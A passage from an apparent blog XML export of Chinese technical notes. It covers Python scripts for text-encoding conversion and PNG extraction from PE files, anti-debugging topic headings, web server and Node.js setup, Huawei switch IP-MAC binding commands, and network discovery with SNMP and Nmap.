<li><a href="https://ai.nationalchip.com/docs/gx8010/kuai-su-shang-shou-zhi-dao/diao-shi-gong-ju-jie-shao/adbde-an-zhuang-he-shi-yong.html" target="_blank" rel="noopener">adb的安装和使用</a>,by GX8010.</li>
<li><a href="https://juejin.cn/s/%E5%AE%89%E5%8D%93%E6%8F%90%E5%8F%96apk%E5%AE%89%E8%A3%85%E5%8C%85" target="_blank" rel="noopener">安卓提取apk安装包</a>,by juejin.</li>
<li><a href="https://blog.csdn.net/oYuDaBaJiao/article/details/53410634" target="_blank" rel="noopener">从Android 手机取出已安装apk文件</a>,by 雨打芭蕉.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>Andriod</tag>
      </tags>
  </entry>
  <entry>
    <title>Python文本文件编码格式批量转换</title>
    <url>/2023/07/11/Python%E6%96%87%E6%9C%AC%E6%96%87%E4%BB%B6%E7%BC%96%E7%A0%81%E6%A0%BC%E5%BC%8F%E6%89%B9%E9%87%8F%E8%BD%AC%E6%8D%A2/</url>
    <content><![CDATA[<p>最近获得一个Matlab高版本的项目代码，其文本文件时utf8编码格式，而我的Matlab版本比较低，只支持gbk编码格式，于是采用Python批量转换文本编码格式。代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import os,sys</span><br><span class="line"></span><br><span class="line">extArray&#x3D;(&quot;.m&quot;,&quot;.txt&quot;)</span><br><span class="line"> </span><br><span class="line">def convert( filename, in_enc &#x3D; &quot;UTF-8&quot;, out_enc&#x3D;&quot;GBK&quot; ):</span><br><span class="line">    try:</span><br><span class="line">        print(&quot;convert &quot; + filename)</span><br><span class="line">        targetFile &#x3D; open(filename,&#39;r&#39;,encoding&#x3D;in_enc)</span><br><span class="line">        content &#x3D; targetFile.read()</span><br><span class="line">        targetFile.close()</span><br><span class="line"></span><br><span class="line">        targetFile &#x3D; open(filename,&#39;w&#39;,encoding&#x3D;out_enc)</span><br><span class="line">        targetFile.write(content)</span><br><span class="line">        targetFile.close()</span><br><span class="line">    except:</span><br><span class="line">        targetFile.close()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def explore(dir):</span><br><span class="line">    for root, dirs, files in os.walk(dir):</span><br><span class="line">        for file in files:</span><br><span class="line">            path &#x3D; os.path.join(root, file)</span><br><span class="line">            if(path.endswith(extArray)):</span><br><span class="line">                convert(path)</span><br><span class="line"> </span><br><span class="line">def main():</span><br><span class="line">    for path in sys.argv[1:]:</span><br><span class="line">        if os.path.isfile(path):</span><br><span class="line">            convert(path)</span><br><span class="line">        elif os.path.isdir(path):</span><br><span class="line">            explore(path)</span><br><span class="line"> </span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>运行时采用如下命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -m venv env</span><br><span class="line">.\env\Scripts\activate</span><br><span class="line">python utf8_to_gbk.py filepath</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/weixin_33826268/article/details/85535203" target="_blank" rel="noopener">Python遍历路径下文件并转换成UTF-8编码</a>,by weixin_33826268.</li>
<li><a href="https://blog.csdn.net/huang_0430/article/details/72638269" target="_blank" rel="noopener">Python 批量转换文件编码格式</a>,by huang_0430.</li>
<li><a href="https://www.zhihu.com/question/19677619" target="_blank" rel="noopener">GB2312、GBK、GB18030 这几种字符集的主要区别是什么？</a>,by zhihu.</li>
<li><a href="https://cloud.tencent.com/developer/article/1343240" target="_blank" rel="noopener">一图弄懂ASCII、GB2312、GBK、GB18030编码</a>,by horstxu.</li>
<li><a href="https://www.51cto.com/article/661981.html" target="_blank" rel="noopener">Unicode、UTF-8、UTF-16 终于懂了</a>,by LinuxThings.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows程序反调试技术笔记</title>
    <url>/2023/07/27/Windows%E7%A8%8B%E5%BA%8F%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>最近在使用IDA和X64dgb调试Windows可执行程序时，老是失败，严重怀疑其使用了反调试技术。因此学习一下Windows程序反调试技术，以期望能解决Windows可执行程序动态调试失败的问题。</p>
<h1 id="静态反调试技术"><a href="#静态反调试技术" class="headerlink" title="静态反调试技术"></a>静态反调试技术</h1><h2 id="进程状态检测"><a href="#进程状态检测" class="headerlink" title="进程状态检测"></a>进程状态检测</h2><h2 id="调试环境检测"><a href="#调试环境检测" class="headerlink" title="调试环境检测"></a>调试环境检测</h2><h1 id="动态反调试技术"><a href="#动态反调试技术" class="headerlink" title="动态反调试技术"></a>动态反调试技术</h1><h2 id="时钟检测"><a href="#时钟检测" class="headerlink" title="时钟检测"></a>时钟检测</h2><h2 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h2><h2 id="0XCC探测"><a href="#0XCC探测" class="headerlink" title="0XCC探测"></a>0XCC探测</h2><h2 id="硬件断点检测"><a href="#硬件断点检测" class="headerlink" title="硬件断点检测"></a>硬件断点检测</h2><h2 id="自调试"><a href="#自调试" class="headerlink" title="自调试"></a>自调试</h2><h2 id="单步检测"><a href="#单步检测" class="headerlink" title="单步检测"></a>单步检测</h2><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="http://blog.topsec.com.cn/windows%E4%B8%8B%E5%8F%8D%EF%BC%88%E5%8F%8D%EF%BC%89%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF%E6%B1%87%E6%80%BB/" target="_blank" rel="noopener">Windows下反（反）调试技术汇总</a>,by topsec.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
        <tag>QT</tag>
      </tags>
  </entry>
  <entry>
    <title>Web服务器配置方法记录</title>
    <url>/2023/08/03/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AE%E6%96%B9%E6%B3%95%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>常用的Web服务器主要有Apache和Ngnix，下面记录其配置方法。</p>
<h1 id="Apache-Web服务器"><a href="#Apache-Web服务器" class="headerlink" title="Apache Web服务器"></a>Apache Web服务器</h1><blockquote>
<p>Apache HTTP Server（简称Apache）是Apache软件基金会的一个开放源码的网页服务器软件，可以在大多数电脑操作系统中运行。由于其跨平台和安全性，被广泛使用，是最流行的Web服务器软件之一。它快速、可靠并且可通过简单的API扩展，将Perl／Python等解释器编译到服务器中。</p>
</blockquote>
<h2 id="httpd-conf配置"><a href="#httpd-conf配置" class="headerlink" title="httpd.conf配置"></a>httpd.conf配置</h2><p>Apache的主配置文件是httpd.conf。</p>
<h2 id="httpd-vhosts-conf配置"><a href="#httpd-vhosts-conf配置" class="headerlink" title="httpd-vhosts.conf配置"></a>httpd-vhosts.conf配置</h2><p>Apache虚拟主机的配置文件是httpd-vhosts.conf。</p>
<h2 id="问题清单"><a href="#问题清单" class="headerlink" title="问题清单"></a>问题清单</h2><ul>
<li>Apache配置虚拟主机后，不能访问localhost，但使用127.0.0.1可以访问的问题</li>
</ul>
<p>请参考<a href="https://www.jianshu.com/p/d6207118c577" target="_blank" rel="noopener">Apache配置虚拟主机后，不能访问localhost的问题</a>。</p>
<h1 id="Ngnix-Web服务器"><a href="#Ngnix-Web服务器" class="headerlink" title="Ngnix Web服务器"></a>Ngnix Web服务器</h1><blockquote>
<p>Nginx（发音同“engine X”）是异步框架的网页服务器，也可以用作反向代理、负载平衡器和HTTP缓存。该软件由俄罗斯程序员伊戈尔·赛索耶夫（Игорь Сысоев）开发并于2004年首次公开发布。2011年成立同名公司以提供支持服务。2019年3月11日，Nginx公司被F5网络公司以6.7亿美元收购。</p>
</blockquote>
<h2 id="nginx-conf配置"><a href="#nginx-conf配置" class="headerlink" title="nginx.conf配置"></a>nginx.conf配置</h2><blockquote>
<p>Nginx的主配置文件是nginx.conf，这个配置文件一共由三部分组成，分别为全局块、events块和http块。在http块中，又包含http全局块、多个server块。每个server块中，可以包含server全局块和多个location块。在同一配置块中嵌套的配置块，各个之间不存在次序关系。</p>
</blockquote>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.jianshu.com/p/c36dd3946e74" target="_blank" rel="noopener">Apache配置文件httpd.conf详解</a>,by garyond.</li>
<li><a href="https://blog.si-yee.com/2019/04/29/Apache%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%AF%A6%E8%A7%A3/" target="_blank" rel="noopener">Apache配置文件详解</a>,by 思忆技术.</li>
<li><a href="https://www.cnblogs.com/centos2017/p/7896698.html" target="_blank" rel="noopener">Apache httpd.conf配置文件 3(虚拟主机)</a>,by 乌托邦眺望.</li>
<li><a href="https://zh.wikipedia.org/zh-cn/Apache_HTTP_Server" target="_blank" rel="noopener">Apache HTTP服务器</a>,by wikipedia.</li>
<li><a href="https://www.cnblogs.com/54chensongxia/p/12938929.html" target="_blank" rel="noopener">Nginx配置文件详解</a>,by 程序员自由之路.</li>
<li><a href="https://zhuanlan.zhihu.com/p/372610935" target="_blank" rel="noopener">万字长文看Nginx配置详解!</a>,by 大江狗.</li>
<li><a href="https://zh.wikipedia.org/zh-cn/Nginx" target="_blank" rel="noopener">Nginx</a>,by wikipedia.</li>
<li><a href="https://www.jianshu.com/p/d6207118c577" target="_blank" rel="noopener">Apache配置虚拟主机后，不能访问localhost的问题</a>,by LauEl.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>Python从PE文件中导出资源文件</title>
    <url>/2023/08/16/Python%E4%BB%8EPE%E6%96%87%E4%BB%B6%E4%B8%AD%E5%AF%BC%E5%87%BA%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6/</url>
    <content><![CDATA[<p>最近需要修改一个QT编写的应用，就是将资源图片修改一下，但是资源图片被打包到DLL的.rdata段中，无法直接导出，于是想通过Python直接读取导出，然后定位需要修改图片的位置。具体代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"> </span><br><span class="line">import os,sys,re</span><br><span class="line"> </span><br><span class="line">def find_all_pos(filename,feature):</span><br><span class="line">    &quot;&quot;&quot;打开二进制文件，搜索指定特征的位置，并返回所有位置的列表</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    with open(filename, &#39;rb&#39;) as binFile:</span><br><span class="line">        binFileStr &#x3D; binFile.read()</span><br><span class="line">        posArray &#x3D; [m.start() for m in re.finditer(feature, binFileStr)]</span><br><span class="line">        return posArray</span><br><span class="line"></span><br><span class="line">def export_all_png(filename,posArray):</span><br><span class="line">    &quot;&quot;&quot;打开二进制文件，根据特征位置数组，导出所有的PNG文件</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    with open(filename, &#39;rb&#39;) as binFile:    </span><br><span class="line">        for i in range(len(posArray)-1):</span><br><span class="line">            pngLen &#x3D; posArray[i+1] - posArray[i]</span><br><span class="line">            # print(pngLen)</span><br><span class="line">            binFile.seek(posArray[i])</span><br><span class="line">            pngFileBin &#x3D; binFile.read(pngLen)</span><br><span class="line">            pngFile &#x3D; open(&quot;res\\&quot;+str(i)+&quot;.png&quot;, &quot;wb&quot;)</span><br><span class="line">            pngFile.write(pngFileBin)</span><br><span class="line"></span><br><span class="line">def find_feature_pos(filename,feature):</span><br><span class="line">    &quot;&quot;&quot;打开二进制文件，搜索指定特征最早出现的位置，并返回结果</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    with open(filename, &#39;rb&#39;) as binFile:</span><br><span class="line">        binFileStr &#x3D; binFile.read()</span><br><span class="line">        result &#x3D; re.search(feature,binFileStr)</span><br><span class="line">        try:</span><br><span class="line">            return result.span(0)[0]</span><br><span class="line">        except:</span><br><span class="line">            return -1</span><br><span class="line">        </span><br><span class="line">def merge_new_file(filename,feature_pos):</span><br><span class="line">    &quot;&quot;&quot;打开二进制文件，提取特征之后的数据，与新的文件头合并</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    file_header&#x3D;b&quot;\x44\x55\x66&quot;</span><br><span class="line">    with open(filename, &#39;rb&#39;) as binFile:    </span><br><span class="line">            binFile.seek(feature_pos)</span><br><span class="line">            datFileBin &#x3D; binFile.read()</span><br><span class="line">            datFile &#x3D; open(filename[:-4]+&quot;_new&quot;+filename[-4:], &quot;wb&quot;)</span><br><span class="line">            datFile.write(file_header)</span><br><span class="line">            datFile.write(datFileBin)</span><br><span class="line"> </span><br><span class="line">def walk_files(src_filepath &#x3D; &quot;.&quot;, file_name_feature&#x3D;&quot;.exe&quot;):</span><br><span class="line">    &quot;&quot;&quot;遍历目录中的文件，提取指定特征的文件</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    filepath_list &#x3D; []</span><br><span class="line">   </span><br><span class="line">    for root, dirs, files in os.walk(src_filepath):</span><br><span class="line">        for file in files:</span><br><span class="line">            if file.endswith(file_name_feature)&#x3D;&#x3D;False:</span><br><span class="line">                continue</span><br><span class="line">            if root &#x3D;&#x3D; &#39;.&#39;:</span><br><span class="line">                root_path &#x3D; os.getcwd() + &quot;&#x2F;&quot;</span><br><span class="line">            else:</span><br><span class="line">                root_path &#x3D; root</span><br><span class="line">            </span><br><span class="line">            if (root_path !&#x3D; src_filepath) and (root !&#x3D; &#39;.&#39;):</span><br><span class="line">                filepath &#x3D; root_path + &quot;&#x2F;&quot; + file</span><br><span class="line">            else:</span><br><span class="line">                filepath &#x3D; root_path + file</span><br><span class="line">            </span><br><span class="line">            if filepath not in filepath_list:</span><br><span class="line">                filepath_list.append(filepath)</span><br><span class="line">                       </span><br><span class="line">    return filepath_list</span><br><span class="line"> </span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    for path in sys.argv[1:]:</span><br><span class="line">        if os.path.isfile(path):</span><br><span class="line">            posArray &#x3D; find_all_pos(path,b&quot;\x89\x50\x4E\x47\x0D\x0A\x1A\x0A&quot;)</span><br><span class="line">            # 位置数组应该大于1</span><br><span class="line">            if(len(posArray)&gt;1):</span><br><span class="line">                # print(posArray)</span><br><span class="line">                if(os.path.exists(&quot;res&quot;)&#x3D;&#x3D;False):</span><br><span class="line">                    os.makedirs(&quot;res&quot;) </span><br><span class="line">                pngList&#x3D;&quot;&quot;</span><br><span class="line">                for i in range(len(posArray)):</span><br><span class="line">                    pngList &#x3D; pngList + str(i) + &quot;,0x%x&quot;%posArray[i] +&quot;\n&quot;</span><br><span class="line">                # 保存图片位置信息</span><br><span class="line">                pngFileMeta &#x3D; open(&quot;res\\pnglistpos.csv&quot;, &quot;w&quot;)</span><br><span class="line">                pngFileMeta.write(pngList)</span><br><span class="line"></span><br><span class="line">                export_all_png(path,posArray)</span><br></pre></td></tr></table></figure>

<p>运行时采用如下命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -m venv env</span><br><span class="line">.\env\Scripts\activate</span><br><span class="line">python utf8_to_gbk.py filepath</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.freebuf.com/articles/others-articles/265879.html" target="_blank" rel="noopener">PNG文件格式详解</a>,by oriole.</li>
<li><a href="https://blog.csdn.net/xjp_xujiping/article/details/88936960" target="_blank" rel="noopener">Python输出列表list</a>,by huang_0430.</li>
<li><a href="https://blog.csdn.net/MuWinter/article/details/77215768" target="_blank" rel="noopener">python创建目录（文件夹)</a>,by FanWinter.</li>
<li><a href="https://blog.csdn.net/wowocpp/article/details/79379342" target="_blank" rel="noopener">python 数字 十六进制 打印</a>,by wowocpp.</li>
<li><a href="https://developer.aliyun.com/article/889827" target="_blank" rel="noopener">python文件的打开、读取、关闭、写入与二进制文件的读写操作</a>,by aliyun.</li>
<li><a href="https://stackoverflow.com/questions/4664850/how-to-find-all-occurrences-of-a-substring" target="_blank" rel="noopener">How to find all occurrences of a substring?</a>,by stackoverflow.</li>
<li><a href="https://zhuanlan.zhihu.com/p/54581546" target="_blank" rel="noopener">如何逆向解决QT程序汉化中的乱码问题-干货</a>,by 葫芦娃很厉害.</li>
<li><a href="https://bbs.kanxue.com/thread-28321.htm" target="_blank" rel="noopener">如何汉化一个软件</a>,by CCDebuger.</li>
<li><a href="https://zhuanlan.zhihu.com/p/60457016" target="_blank" rel="noopener">Qt 资源系统（Qt Resource System）</a>,by 南理汉子.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>nodejs参考架构</title>
    <url>/2023/09/05/nodejs%E5%8F%82%E8%80%83%E6%9E%B6%E6%9E%84/</url>
    <content><![CDATA[<p>JavaScript 生态系统是快速发展且充满活力的，但是各种各样的选项可能会使在 Node.js 包之间进行选择变得非常困难。因此，拥有参考架构可以帮助团队避免一次又一次地重新学习相同的内容。</p>
<h1 id="日志记录工具"><a href="#日志记录工具" class="headerlink" title="日志记录工具"></a>日志记录工具</h1><p>Pino 是非常低的开销node.js日志记录器。</p>
<h2 id="Pino-with-Express"><a href="#Pino-with-Express" class="headerlink" title="Pino with Express"></a>Pino with Express</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install pino-http</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const app &#x3D; require(&#39;express&#39;)()</span><br><span class="line">const pino &#x3D; require(&#39;pino-http&#39;)()</span><br><span class="line"></span><br><span class="line">app.use(pino)</span><br><span class="line"></span><br><span class="line">app.get(&#39;&#x2F;&#39;, function (req, res) &#123;</span><br><span class="line">  req.log.info(&#39;something&#39;)</span><br><span class="line">  res.send(&#39;hello world&#39;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(3000)</span><br></pre></td></tr></table></figure>

<h1 id="代码一致性工具"><a href="#代码一致性工具" class="headerlink" title="代码一致性工具"></a>代码一致性工具</h1><p>ESLint 用于检查JavaScript代码是否符合规则，由Nicholas C. Zakas在2013年创建。</p>
<h1 id="选择-Web-框架"><a href="#选择-Web-框架" class="headerlink" title="选择 Web 框架"></a>选择 Web 框架</h1><p>构建企业Node.js应用程序时做出的关键选择之一是将作为其基础的 Web 框架。而 Express.js 是一个不错的默认选择。</p>
<h1 id="代码覆盖率"><a href="#代码覆盖率" class="headerlink" title="代码覆盖率"></a>代码覆盖率</h1><p>代码覆盖率是一种软件测试指标，它确定项目中有多少代码在测试过程下已成功验证，这反过来又有助于分析软件验证的彻底程度。</p>
<ul>
<li>nyc，可能是最流行的代码覆盖率工具。该模块最受欢迎的主要原因之一是它与大多数 JavaScript 测试框架都能很好地配合。nyc是 的后继命令行界面 (CLI) istanbul。</li>
<li>Jest，当您使用该选项运行该工具时，它会生成覆盖范围–coverage。</li>
</ul>
<h2 id="测试示例"><a href="#测试示例" class="headerlink" title="测试示例"></a>测试示例</h2><p>以nyc为例，该示例由文件中的两个简单函数以及使用Mocha 测试运行程序index.js的目录中的测试组成。</p>
<p>第一个函数将两个数字相加：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function addTwoNumbers(x, y) &#123;</span><br><span class="line"></span><br><span class="line">  return x + y;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个函数可以通过这个简单的测试轻松覆盖：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">describe(&#39;testing for coverage&#39;, () &#x3D;&gt; &#123;</span><br><span class="line"></span><br><span class="line">  it (&#39;should add 2 numbers correctly&#39;, () &#x3D;&gt; &#123;</span><br><span class="line"></span><br><span class="line">    assert.equal(addTwoNumbers(1,1), 2);</span><br><span class="line"></span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://developers.redhat.com/blog/2021/03/08/introduction-to-the-node-js-reference-architecture-part-1-overview" target="_blank" rel="noopener">Why we developed the Node.js reference architecture</a>,by redhat.</li>
<li><a href="https://developers.redhat.com/articles/2022/03/02/introduction-nodejs-reference-architecture-part-7-code-coverage" target="_blank" rel="noopener">Introduction to the Node.js reference architecture, Part 7: Code coverage</a>,by redhat.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title>VSCode常用插件推荐</title>
    <url>/2023/09/12/VSCode%E5%B8%B8%E7%94%A8%E6%8F%92%E4%BB%B6%E6%8E%A8%E8%8D%90/</url>
    <content><![CDATA[<p>Visual Studio Code（简称VS Code）是一个由微软开发，同时支持Windows 、 Linux和macOS等操作系统且开放源代码的代码编辑器。与Sublime相比，VSCode开源，且有强大的社区支持，各种插件层出不穷。下面记录一些常用的VSCode插件。</p>
<h1 id="Hex-Editor"><a href="#Hex-Editor" class="headerlink" title="Hex Editor"></a>Hex Editor</h1><p>可以二进制形式查看编辑文件内容。例如，可方便查看同样汉字在不同字符编码下对应的二进制。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zhuanlan.zhihu.com/p/384730993" target="_blank" rel="noopener">VS code常用插件推荐（总结整理篇）</a>,by 苏梦苓​.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>华为交换机配置学习笔记</title>
    <url>/2023/09/14/%E5%8D%8E%E4%B8%BA%E4%BA%A4%E6%8D%A2%E6%9C%BA%E9%85%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>学习一下网络交换机配置的知识，记录一下。</p>
<h1 id="eNSP简介"><a href="#eNSP简介" class="headerlink" title="eNSP简介"></a>eNSP简介</h1><p>eNSP(Enterprise Network Simulation Platform)是一款由华为提供的免费的、可扩展的、图形化的网络设备仿真平台，主要对企业网路由器、交换机、WLAN等设备进行软件仿真，完美呈现真实设备部署实景，支持大型网络模拟，让你有机会在没有真实设备的情况下也能够开展实验测试，学习网络技术。</p>
<p>eNSP具体安装过程请参考:</p>
<ul>
<li><a href="https://bbs.huaweicloud.com/blogs/348672" target="_blank" rel="noopener">ENSP安装教程【手把手教学】</a></li>
<li><a href="https://king321.cn/%E8%A7%A3%E5%86%B3virtualbox-host-only-network2%E9%97%AE%E9%A2%98/" target="_blank" rel="noopener">解决VirtualBox Host-Only NetWork #2问题</a></li>
<li><a href="https://blog.csdn.net/yanjian_0809/article/details/103079445" target="_blank" rel="noopener">使用VirtualBox打开虚拟机报错：Raw-mode is unavailable courtesy of Hyper-V</a></li>
<li><a href="https://appuals.com/fix-virtual-machine-has-terminated-unexpectedly-during-startup-with-exit-code-1-0x1/" target="_blank" rel="noopener">5 Ways to Fix ‘Virtual machine has terminated unexpectedly’ Error</a></li>
</ul>
<h1 id="VRP简介"><a href="#VRP简介" class="headerlink" title="VRP简介"></a>VRP简介</h1><h1 id="常用场景"><a href="#常用场景" class="headerlink" title="常用场景"></a>常用场景</h1><h2 id="IP与Mac绑定"><a href="#IP与Mac绑定" class="headerlink" title="IP与Mac绑定"></a>IP与Mac绑定</h2><p>具体流程如下：</p>
<ol>
<li>查看目标IP将要接入的交换机管理IP。</li>
<li>登录接入层交换机</li>
<li>进入交换机系统视图，静态绑定IP与Mac地址</li>
</ol>
<p>具体命令如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">telnet 192.168.0.111</span><br><span class="line">&gt; display current-configuration</span><br><span class="line"># 查看mac要绑定的交换机端口</span><br><span class="line">&gt; display mac-address | include c03f-abcd-cc92</span><br><span class="line"># 查看路由表</span><br><span class="line">&gt; display ip routing-table</span><br><span class="line">&gt; system-view</span><br><span class="line">] interface GigabitEthernet 0&#x2F;0&#x2F;8</span><br><span class="line"># 查看交换机网口配置</span><br><span class="line">] display this</span><br><span class="line"># 使能动态arp检测功能</span><br><span class="line">] arp anti-attack check user-bind enable</span><br><span class="line"># 使能ip报文检查功能</span><br><span class="line">] ip source check user-bind enable</span><br><span class="line">] display this</span><br><span class="line"># 以下命令可将IP、Mac、Interface、Vlan进行绑定</span><br><span class="line">] user-bind static ip-address 10.0.0.32 mac-address c03f-abcd-cc92 interface GigabitEthernet 0&#x2F;0&#x2F;8 vlan 8</span><br><span class="line">] quit</span><br><span class="line">&gt; save</span><br></pre></td></tr></table></figure>

<h2 id="IP与Mac解绑"><a href="#IP与Mac解绑" class="headerlink" title="IP与Mac解绑"></a>IP与Mac解绑</h2><p>具体命令如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">telnet 192.168.0.111</span><br><span class="line">&gt; system-view</span><br><span class="line">] undo user-bind static ip-address 10.0.0.32 mac-address c03f-abcd-cc92 vlan 8</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://book.douban.com/subject/26629364/" target="_blank" rel="noopener">HCNA网络技术实验指南</a>,by 华为技术有限公司.</li>
<li><a href="https://bbs.huaweicloud.com/blogs/348672" target="_blank" rel="noopener">ENSP安装教程【手把手教学】</a>,by 黑城笑.</li>
<li><a href="https://king321.cn/%E8%A7%A3%E5%86%B3virtualbox-host-only-network2%E9%97%AE%E9%A2%98/" target="_blank" rel="noopener">解决VirtualBox Host-Only NetWork #2问题</a>,by King.</li>
<li><a href="https://blog.csdn.net/yanjian_0809/article/details/103079445" target="_blank" rel="noopener">使用VirtualBox打开虚拟机报错：Raw-mode is unavailable courtesy of Hyper-V</a>,by yanjian_0809.</li>
<li><a href="https://appuals.com/fix-virtual-machine-has-terminated-unexpectedly-during-startup-with-exit-code-1-0x1/" target="_blank" rel="noopener">5 Ways to Fix ‘Virtual machine has terminated unexpectedly’ Error</a>,by Kevin Arrows.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>x3py插件框架学习笔记</title>
    <url>/2023/09/28/x3py%E6%8F%92%E4%BB%B6%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<blockquote>
<p>x3py是一个可与Python等集成的轻量级C++插件框架。该框架使用了少部分STL，没有使用MFC、ATL、COM。x3py 通过使用 SWIG，可与 Python 等语言进行集成（当然可以单独使用C++）。使用此框架可以快速开发出更多的插件和应用软件，此框架已在 Windows/Linux/MacOSX 上测试过。</p>
</blockquote>
<h1 id="插件原理"><a href="#插件原理" class="headerlink" title="插件原理"></a>插件原理</h1><p>请参考：</p>
<ul>
<li><a href="https://github.com/rhcad/x3py/wiki/AboutPlugin" target="_blank" rel="noopener">插件原理</a></li>
<li><a href="https://github.com/rhcad/x3py/wiki/Observer" target="_blank" rel="noopener">事件驱动机制（Observer）</a></li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://github.com/rhcad/x3py" target="_blank" rel="noopener">x3py wiki</a>,by rhcad.</li>
<li><a href="https://github.com/rhcad/x3py/wiki/AboutPlugin" target="_blank" rel="noopener">插件原理</a>,by rhcad.</li>
<li><a href="https://blog.51cto.com/u_10125763/5250826" target="_blank" rel="noopener">c++插件机制的实现原理、过程、及使用 </a>,by 特立独行的猫a.</li>
<li><a href="https://github.com/rhcad/x3py/wiki/Observer" target="_blank" rel="noopener">事件驱动机制（Observer）</a>,by rhcad.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>网络拓扑自动发现的方法</title>
    <url>/2023/10/11/%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91%E8%87%AA%E5%8A%A8%E5%8F%91%E7%8E%B0%E7%9A%84%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>作为网络管理员，了解整个单位的网络拓扑结构，是保障和维护网络的基础。通常可以通过手动绘制的方式获得网络拓扑结构，但这种方法效率低，不精确，无法实时更新，因此需要一种网络拓扑自动发现的方法。下面记录一些与网络拓扑自动发现相关的方法与技术。</p>
<h1 id="SNMP"><a href="#SNMP" class="headerlink" title="SNMP"></a>SNMP</h1><p>SNMP是广泛应用于TCP/IP网络的网络管理标准协议，该协议能够支持网络管理系统，用以监测连接到网络上的设备是否有任何引起管理上关注的情况。</p>
<p>SNMP基本组件包括网络管理系统NMS（Network Management System）、代理进程（Agent）、被管对象（Managed Object）和管理信息库MIB（Management Information Base）。</p>
<p align="center" style="display: flex;">
    <img src="images/snmp_model.png" width="40%" alt="snmp管理模型"/>
</p>
<center>图1 snmp管理模型</center>

<h1 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h1><p>Nmap（网络映射器）是一款用于网络发现和安全审计的网络安全工具。Nmap可以检测目标主机是否在线、端口开放情况、侦测运行的服务类型及版本信息、侦测操作系统与设备类型等信息。 它是网络管理员必用的软件之一，用以评估网络系统安全。</p>
